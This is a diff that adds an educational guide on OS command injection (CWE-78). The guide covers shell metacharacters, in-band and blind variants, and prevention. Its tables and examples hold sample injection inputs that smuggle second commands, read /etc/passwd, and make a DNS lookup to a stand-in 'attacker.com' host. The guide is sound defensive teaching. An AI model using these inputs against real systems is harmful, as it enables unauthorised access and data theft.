@@ -1,0 +1,188 @@
+---
+id: command-injection
+title: Command Injection (CWE-78)
+---
+
+<style>
+.section {
+  margin-bottom: 2rem;
+}
+
+.subsection {
+  margin-bottom: 1.5rem;
+  margin-left: 1rem;
+}
+
+.concept-box {
+  background-color: rgba(0, 0, 0, 0.05);
+  border-left: 4px solid rgb(219, 39, 119);
+  padding: 1rem;
+  margin: 1.5rem 0;
+  border-radius: 0.375rem;
+}
+
+.dark .concept-box {
+  background-color: rgba(255, 255, 255, 0.05);
+}
+
+ul.nested-list {
+  list-style: none;
+  padding-left: 0;
+}
+
+ul.nested-list > li {
+  margin-bottom: 0.5rem;
+}
+
+ul.nested-list > li::before {
+  content: "• ";
+  color: rgb(219, 39, 819);
+  font-weight: bold;
+  margin-right: 0.5rem;
+}
+
+ul.nested-list ul {
+  margin-left: 1.5rem;
+  margin-top: 0.5rem;
+  list-style: none;
+}
+
+ul.nested-list ul > li::before {
+  content: "◦ ";
+  color: rgb(219, 39, 819);
+  margin-right: 0.5rem;
+}
+</style>
+
+<h1>Command Injection (CWE-78): A Detailed Guide</h1>
+<p>This guide explains one of the most dangerous web vulnerabilities: OS Command Injection. We will break down what it is, how it works, and the best ways to prevent it.</p>
+<h2>1. What is OS Command Injection?</h2>
+<p><strong>The Core Idea:</strong> An OS Command Injection is an attack where a hacker tricks a web application into running commands on the server&#39;s operating system (OS).</p>
+<p>Imagine a website has a feature that lets you look up information. You type in a username, and the server runs a command like <code>list files for &#39;username&#39;</code>. The application is <em>supposed</em> to only take a username as input. However, a command injection attack happens when an attacker provides a specially crafted input that includes not just a username, but also a malicious OS command.</p>
+<p><strong>A Simple Analogy:</strong></p>
+<ol>
+<li><p><strong>The Application:</strong> A vulnerable script on a server is like a personal assistant who is a bit too trusting. You can ask it, &quot;Please get me the file for &#39;John&#39;.&quot;</p>
+</li>
+<li><p><strong>The Attacker:</strong> An attacker tells the assistant, &quot;Please get me the file for &#39;John&#39; <strong>; and also delete all the other files</strong>.&quot;</p>
+</li>
+<li><p><strong>The Vulnerability:</strong> Because the assistant doesn&#39;t question the second part of the request, it blindly passes the entire command to the operating system.</p>
+</li>
+<li><p><strong>The Result:</strong> The OS executes both commands: it gets John&#39;s file and then proceeds to delete everything else.</p>
+</li>
+</ol>
+<p>A successful attack can give the attacker complete control over the server.</p>
+<h2>2. Why is Command Injection So Dangerous?</h2>
+<p>This vulnerability is critical because it can lead to a full system compromise.</p>
+<ul>
+<li><p><strong>Arbitrary Command Execution:</strong> The attacker isn&#39;t limited to a few actions; they can run <em>any</em> command that the web server user has permission to run.</p>
+</li>
+<li><p><strong>Remote Access:</strong> Attackers can exploit this vulnerability through a simple web form or URL, meaning they don&#39;t need direct login access to the server.</p>
+</li>
+<li><p><strong>Privilege Escalation:</strong> If the web application is running with high privileges (e.g., as the &#39;root&#39; or &#39;administrator&#39; user), the attacker&#39;s commands will also run with those same high privileges, giving them total control.</p>
+</li>
+<li><p><strong>Complete System Takeover:</strong> This can lead to:</p>
+<ul>
+<li>Data theft from the server and its databases.</li>
+<li>Installation of malware or backdoors for persistent access.</li>
+<li>Modification or deletion of critical files.</li>
+<li>Using the server to attack other systems.</li>
+</ul>
+</li>
+</ul>
+<h2>3. How Does it Work? The Power of Metacharacters</h2>
+<p>The trick behind command injection is the use of <strong>shell metacharacters</strong>. These are special characters that the operating system&#39;s command line (or &quot;shell&quot;) interprets as instructions to perform a certain action, like combining two commands.</p>
+<p>An attacker includes these characters in their input to fool the application into executing more than one command.</p>
+<table>
+<thead>
+<tr>
+<th>Metacharacter</th>
+<th>Name</th>
+<th>Purpose</th>
+<th>Example (Attacker&#39;s Input)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>;</strong></td>
+<td>Semicolon</td>
+<td>Command Separator: Executes commands sequentially.</td>
+<td><code>127.0.0.1 ; ls -la</code></td>
+</tr>
+<tr>
+<td><strong>&amp;&amp;</strong></td>
+<td>Ampersands</td>
+<td>AND: Executes the second command only if the first succeeds.</td>
+<td><code>127.0.0.1 &amp;&amp; whoami</code></td>
+</tr>
+<tr>
+<td><strong>||</strong></td>
+<td>Pipes</td>
+<td>OR: Executes the second command only if the first fails.</td>
+<td><code>127.0.0.1 || cat /etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>`</code></td>
+<td>Backticks</td>
+<td>Command Substitution: Executes the command inside the backticks and uses its output as input to the main command.</td>
+<td><code>`cat /etc/passwd`</code></td>
+</tr>
+<tr>
+<td><strong>$( )</strong></td>
+<td>Dollar Parens</td>
+<td>Command Substitution: Same as backticks.</td>
+<td><code>$(whoami)</code></td>
+</tr>
+</tbody></table>
+<h2>4. Variants of Command Injection</h2>
+<p>There are two main ways attackers carry out these attacks, based on whether they can see the output of their command.</p>
+<h3>a. In-band (Classic) Command Injection</h3>
+<p>This is the most direct type. The attacker can see the output of their injected command directly in the web application&#39;s response.</p>
+<ul>
+<li><p><strong>Example:</strong> A website has a tool to <code>ping</code> an IP address. The code takes the IP and runs <code>ping -c 3 [IP_ADDRESS]</code>.</p>
+</li>
+<li><p><strong>Attack:</strong> The attacker inputs <code>127.0.0.1 ; whoami</code>.</p>
+</li>
+<li><p><strong>Result:</strong> The server runs <code>ping -c 3 127.0.0.1 ; whoami</code>. The webpage first shows the ping results, and then right below it, it shows the output of the <code>whoami</code> command (e.g., <code>www-data</code>), proving the attack worked.</p>
+</li>
+</ul>
+<h3>b. Out-of-band (Blind) Command Injection</h3>
+<p>This is a stealthier version where the application does not display the output of the command. The attacker has to use other methods to confirm their command was executed.</p>
+<ul>
+<li><p><strong>Time-Based Method:</strong> The attacker injects a command that causes a time delay, like <code>sleep 10</code>. If the website takes an extra 10 seconds to load, they know the injection was successful.</p>
+<ul>
+<li><strong>Attack Input:</strong> <code>127.0.0.1 &amp;&amp; sleep 10</code></li>
+</ul>
+</li>
+<li><p><strong>DNS-Based Method:</strong> The attacker injects a command that forces the server to make a network request to a domain the attacker controls.</p>
+<ul>
+<li><strong>Example:</strong> <code>127.0.0.1 &amp;&amp; nslookup attacker.com</code></li>
+<li><strong>Confirmation:</strong> The attacker monitors their DNS server. If they see a lookup request from the target server, they know the command injection worked.</li>
+</ul>
+</li>
+</ul>
+<h2>5. Real-World Example: PHP CGI Vulnerability (CVE-2024-4577)</h2>
+<p>A well-known PHP vulnerability demonstrated how command injection can occur in default PHP configurations when query parameters are passed to the CGI handler without proper escaping.</p>
+<h2>6. How to Prevent Command Injection</h2>
+<p>The most effective defenses include:</p>
+<ul>
+<li><p><strong>Avoid Calling the Shell:</strong> Never pass user input to shell functions like <code>exec()</code>, <code>system()</code>, <code>shell_exec()</code>, or backticks. These are the primary vectors for command injection.</p>
+</li>
+<li><p><strong>Input Validation:</strong> Use a strict whitelist of allowed characters. For example, if a field should only contain numbers, reject anything that isn&#39;t a digit.</p>
+</li>
+<li><p><strong>Use Safe APIs:</strong> Rather than executing shell commands, utilize structured APIs and language-specific functions that are designed for secure command execution.</p>
+</li>
+<li><p><strong>Escape Input Properly:</strong> If you must pass user input to a shell, use language-specific escaping functions. For example, in PHP use <code>escapeshellarg()</code> and <code>escapeshellcmd()</code>, but this is not a complete solution.</p>
+</li>
+<li><p><strong>Principle of Least Privilege:</strong> Run the web application with the minimum necessary permissions. If the application doesn&#39;t need to write to certain directories or access certain files, it shouldn&#39;t have permission to do so.</p>
+</li>
+<li><p><strong>Sandboxing:</strong> Use OS-level restrictions (containers, virtual machines, chroot jails) to limit what an attacker can do even if they achieve command execution.</p>
+</li>
+</ul>
+<h2>7. Testing for Command Injection</h2>
+<ul>
+<li><p><strong>Manual Testing:</strong> Try common metacharacters and time-based delays.</p>
+</li>
+<li><p><strong>Automated Scanning:</strong> Use Burp Suite or OWASP ZAP.</p>
+</li>
+<li><p><strong>Code Review:</strong> Inspect source code for dangerous function calls.</p>
+</li>
+</ul>
